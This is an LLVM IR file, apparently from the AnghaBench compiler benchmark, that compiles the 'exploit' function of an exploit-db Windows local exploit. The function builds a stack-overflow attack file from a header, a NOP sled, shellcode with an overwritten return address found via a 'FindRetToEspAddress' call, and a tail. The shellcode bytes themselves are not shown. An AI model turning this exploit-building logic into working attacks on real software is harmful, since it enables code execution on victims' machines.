; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_11379.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_11379.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@buffer = common dso_local global i64 0, align 8
@NOPS = common dso_local global i32 0, align 4
@eip = common dso_local global i32 0, align 4
@shellcode = common dso_local global i64 0, align 8
@EIPOFFSET = common dso_local global i64 0, align 8
@header = common dso_local global i64 0, align 8
@tail = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [19 x i8] c"error writing file\00", align 1
@VULNF = common dso_local global i32 0, align 4
@x = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @exploit(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32*, align 8
  store i8* %0, i8** %2, align 8
  %4 = load i8*, i8** %2, align 8
  %5 = call i32* @fopen(i8* %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  store i32* %5, i32** %3, align 8
  %6 = load i32*, i32** %3, align 8
  %7 = icmp ne i32* %6, null
  br i1 %7, label %8, label %34

8:                                                ; preds = %1
  %9 = load i64, i64* @buffer, align 8
  %10 = load i32, i32* @NOPS, align 4
  %11 = call i32 @memset(i64 %9, i32 144, i32 %10)
  %12 = call i32 (...) @FindRetToEspAddress()
  store i32 %12, i32* @eip, align 4
  %13 = load i64, i64* @shellcode, align 8
  %14 = load i64, i64* @EIPOFFSET, align 8
  %15 = add nsw i64 %13, %14
  %16 = call i32 @memcpy(i64 %15, i32* @eip, i32 4)
  %17 = load i64, i64* @header, align 8
  %18 = load i32*, i32** %3, align 8
  %19 = call i32 @fwrite(i64 %17, i32 1, i32 84, i32* %18)
  %20 = load i64, i64* @buffer, align 8
  %21 = load i32, i32* @NOPS, align 4
  %22 = load i32*, i32** %3, align 8
  %23 = call i32 @fwrite(i64 %20, i32 1, i32 %21, i32* %22)
  %24 = load i64, i64* @shellcode, align 8
  %25 = load i32*, i32** %3, align 8
  %26 = call i32 @fwrite(i64 %24, i32 1, i32 204, i32* %25)
  %27 = load i64, i64* @tail, align 8
  %28 = load i32*, i32** %3, align 8
  %29 = call i32 @fwrite(i64 %27, i32 1, i32 216, i32* %28)
  %30 = load i32*, i32** %3, align 8
  %31 = call i32 @fclose(i32* %30)
  %32 = load i64, i64* @buffer, align 8
  %33 = call i32 @free(i64 %32)
  br label %37

34:                                               ; preds = %1
  %35 = call i32 @print(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %36 = call i32 @exit(i32 0) #3
  unreachable

37:                                               ; preds = %8
  %38 = load i32*, i32** %3, align 8
  %39 = load i32, i32* @VULNF, align 4
  %40 = call i32 @getFsize(i32* %38, i32 %39)
  store i32 %40, i32* @x, align 4
  ret void
}

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @memset(i64, i32, i32) #1

declare dso_local i32 @FindRetToEspAddress(...) #1

declare dso_local i32 @memcpy(i64, i32*, i32) #1

declare dso_local i32 @fwrite(i64, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i64) #1

declare dso_local i32 @print(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getFsize(i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
